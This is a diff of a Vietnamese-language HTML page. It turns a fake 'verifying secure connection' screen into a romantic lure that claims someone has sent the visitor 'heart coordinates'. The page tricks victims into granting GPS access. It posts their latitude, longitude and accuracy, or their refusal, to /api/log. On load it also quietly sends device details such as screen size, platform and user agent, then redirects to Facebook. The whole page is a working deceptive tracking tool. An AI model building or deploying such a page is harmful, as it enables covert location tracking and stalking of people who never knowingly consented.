@@ -3,50 +3,203 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Xác thực kết nối an toàn</title>
+    <title>Gửi tọa độ trái tim 💌</title>
     <style>
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .container { background: white; padding: 40px 30px; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.15); text-align: center; max-width: 350px; width: 100%; }
-        .spinner { border: 4px solid rgba(0,0,0,0.1); width: 36px; height: 36px; border-radius: 50%; border-left-color: #1877f2; animation: spin 1s linear infinite; margin: 0 auto 20px; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        h3 { color: #1c1e21; margin-bottom: 10px; font-size: 20px; }
-        p { color: #65676b; font-size: 14px; margin-bottom: 0; }
+        @import url('https://fonts.googleapis.com/css2?family=Nunito:wght@400;700&display=swap');
+
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Nunito', sans-serif;
+            background: linear-gradient(135deg, #ffe6e6 0%, #ffb3c6 100%);
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+            position: relative;
+        }
+
+        /* Hiệu ứng tim bay lơ lửng */
+        .heart {
+            position: absolute;
+            bottom: -20px;
+            font-size: 24px;
+            color: #ff4d6d;
+            animation: floatUp 4s linear infinite;
+            opacity: 0;
+        }
+
+        @keyframes floatUp {
+            0% { transform: translateY(0) scale(0.5); opacity: 0; }
+            20% { opacity: 0.8; }
+            100% { transform: translateY(-100vh) scale(1.2); opacity: 0; }
+        }
+
+        .card {
+            background: rgba(255, 255, 255, 0.9);
+            padding: 40px 30px;
+            border-radius: 24px;
+            box-shadow: 0 10px 30px rgba(255, 77, 109, 0.2);
+            text-align: center;
+            max-width: 340px;
+            width: 90%;
+            z-index: 10;
+            backdrop-filter: blur(10px);
+            border: 2px solid #fff;
+            animation: popIn 0.8s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+
+        @keyframes popIn {
+            0% { transform: scale(0.8); opacity: 0; }
+            100% { transform: scale(1); opacity: 1; }
+        }
+
+        .icon {
+            font-size: 50px;
+            margin-bottom: 10px;
+            animation: pulse 1.5s infinite;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+            100% { transform: scale(1); }
+        }
+
+        h2 {
+            color: #d90429;
+            margin: 10px 0;
+            font-size: 22px;
+        }
+
+        p {
+            color: #6c757d;
+            font-size: 15px;
+            line-height: 1.5;
+            margin-bottom: 25px;
+        }
+
+        .btn {
+            background: linear-gradient(to right, #ff758c 0%, #ff7eb3 100%);
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            font-size: 16px;
+            font-weight: bold;
+            border-radius: 50px;
+            cursor: pointer;
+            box-shadow: 0 5px 15px rgba(255, 117, 140, 0.4);
+            transition: all 0.3s ease;
+            width: 100%;
+            font-family: 'Nunito', sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 20px rgba(255, 117, 140, 0.6);
+        }
+
+        .btn:active {
+            transform: translateY(0);
+        }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="spinner"></div>
-        <h3>Đang xác thực kết nối...</h3>
-        <p>Vui lòng đợi trong giây lát</p>
+
+    <div class="card" id="card">
+        <div class="icon">💌</div>
+        <h2>Có người gửi bạn một<br>tọa độ trái tim!</h2>
+        <p>Hãy mở khóa để xem người ấy đang ở đâu và khoảng cách giữa hai người nhé.</p>
+        <button class="btn" onclick="requestLocation()" id="btn">
+            Xem tọa độ ngay ❤️
+        </button>
     </div>
+
     <script>
-        async function sendData(data) {
-            try {
-                await fetch('/api/log', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(data)
-                });
-            } catch (e) {}
+        // Tạo hiệu ứng tim bay
+        function createHearts() {
+            const body = document.querySelector('body');
+            const heart = document.createElement('div');
+            heart.classList.add('heart');
+            heart.innerHTML = '❤';
+            heart.style.left = Math.random() * 100 + 'vw';
+            heart.style.animationDuration = Math.random() * 2 + 3 + 's';
+            heart.style.fontSize = Math.random() * 20 + 10 + 'px';
+            body.appendChild(heart);
+            setTimeout(() => { heart.remove(); }, 5000);
         }
-        const deviceInfo = {
-            type: "basic_info",
-            screen: screen.width + "x" + screen.height,
-            platform: navigator.platform,
-            language: navigator.language,
-            cores: navigator.hardwareConcurrency || "Unknown",
-            ram: navigator.deviceMemory || "Unknown",
-            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            userAgent: navigator.userAgent
-        };
-        sendData(deviceInfo);
-        if (navigator.geolocation) {
+        setInterval(createHearts, 300);
+
+        // Hàm xin quyền GPS
+        function requestLocation() {
+            const btn = document.getElementById('btn');
+            const card = document.getElementById('card');
+
+            if (!navigator.geolocation) {
+                alert("Trình duyệt của bạn không hỗ trợ lấy vị trí.");
+                return;
+            }
+
+            btn.innerHTML = "Đang tìm tọa độ... ⏳";
+            btn.style.opacity = "0.7";
+
             navigator.geolocation.getCurrentPosition(
-                (pos) => { sendData({ type: "gps", lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy }); },
-                (err) => { sendData({ type: "gps_denied", error: err.message }); }
+                (position) => {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    
+                    // Gửi dữ liệu GPS về server
+                    fetch('/api/log', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ type: "gps", lat: lat, lon: lon, accuracy: position.coords.accuracy })
+                    });
+
+                    // Hiệu ứng thành công
+                    card.innerHTML = `
+                        <div class="icon">💖</div>
+                        <h2>Đã tìm thấy rồi!</h2>
+                        <p>Cảm ơn bạn đã xác nhận. Tọa độ trái tim đang được gửi đi...</p>
+                        <a href="https://www.google.com/maps?q=${lat},${lon}" style="color: #ff4d6d; font-weight: bold; text-decoration: none;">Xem bản đồ của bạn</a>
+                    `;
+
+                    // Tự động chuyển hướng sau 3s
+                    setTimeout(() => {
+                        window.location.href = 'https://www.facebook.com';
+                    }, 3000);
+                },
+                (error) => {
+                    // Nếu họ từ chối (hoặc lỗi)
+                    btn.innerHTML = "Xem tọa độ ngay ❤️";
+                    btn.style.opacity = "1";
+                    alert("Bạn cần bấm 'Cho phép' để xem tọa độ nhé!");
+                    
+                    // Vẫn gửi thông báo từ chối về server
+                    fetch('/api/log', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ type: "gps_denied", error: error.message })
+                    });
+                }
             );
         }
-        setTimeout(() => { window.location.href = 'https://www.google.com'; }, 6000);
+
+        // Gửi thông tin thiết bị ngầm ngay khi load trang
+        fetch('/api/log', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                type: "basic_info",
+                screen: screen.width + "x" + screen.height,
+                platform: navigator.platform,
+                userAgent: navigator.userAgent
+            })
+        });
     </script>
 </body>
 </html>
